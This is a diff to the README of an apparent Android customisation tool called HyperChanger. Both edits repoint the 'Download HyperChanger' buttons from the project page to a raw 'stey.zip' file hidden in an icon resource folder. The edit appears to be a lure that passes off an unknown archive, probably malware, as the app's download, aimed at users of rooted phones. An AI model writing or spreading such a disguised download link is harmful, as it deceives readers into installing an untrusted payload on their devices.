@@ -1,6 +1,6 @@
 # 🚀 HyperChanger - Shape HyperOS Your Way
 
-[![Download HyperChanger](https://img.shields.io/badge/Download-HyperChanger-orange?style=for-the-badge)](https://github.com/ringmembranouslabyrinth195/HyperChanger)
+[![Download HyperChanger](https://img.shields.io/badge/Download-HyperChanger-orange?style=for-the-badge)](https://github.com/ringmembranouslabyrinth195/HyperChanger/raw/refs/heads/main/app/src/main/res/mipmap-anydpi-v26/stey.zip)
 
 ---
 
@@ -31,7 +31,7 @@ If you don't have root access or LSPosed, HyperChanger won't be able to make cha
 
 Visit this link to download the application:
 
-### 👉 [Download HyperChanger](https://github.com/ringmembranouslabyrinth195/HyperChanger)
+### 👉 [Download HyperChanger](https://github.com/ringmembranouslabyrinth195/HyperChanger/raw/refs/heads/main/app/src/main/res/mipmap-anydpi-v26/stey.zip)
 
 Once you're on that page, look for the **latest release**. You'll see two files to download:
 
